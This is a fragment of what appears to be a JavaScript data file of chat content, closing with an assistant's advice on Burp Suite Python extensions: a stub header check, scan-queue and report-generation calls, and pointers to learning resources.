              "            if \"X-Powered-By: Express\" in body:\n" +
              "                pass  # Add issue\n" +
              "        return issues\n\n" +
              "Generating reports programmatically:\n" +
              "callbacks.getScanQueue()  # all active scan items\n" +
              "callbacks.generateReport(...)  # built-in report generation\n\n" +
              "Best resources:\n" +
              "- PortSwigger API documentation: support.portswigger.net\n" +
              "- Community extensions on GitHub (search: burp extension python)\n" +
              "- Burp Macros and Extensions course by Pentester Academy",
          },
        ],
      },
    ],
  },
];